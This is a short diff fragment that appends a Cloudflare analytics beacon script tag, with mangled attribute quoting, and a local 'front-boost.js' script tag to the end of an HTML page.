+  <script defer="" src="v8c78df7c7c0f484497ecbca7046644da1771523124516" data-cf-beacon="{" version":"2024.11.0","token":"291788ee003a413395b0add202b81cef","r":1,"server_timing":{"name":{"cfcachestatus":true,"cfedge":true,"cfextpri":true,"cfl4":true,"cforigin":true,"cfspeedbrain":true},"location_startswith":null}}"="" crossorigin="anonymous"></script>
+  <script src="js/front-boost.js" defer=""></script>
+
+</body></html>
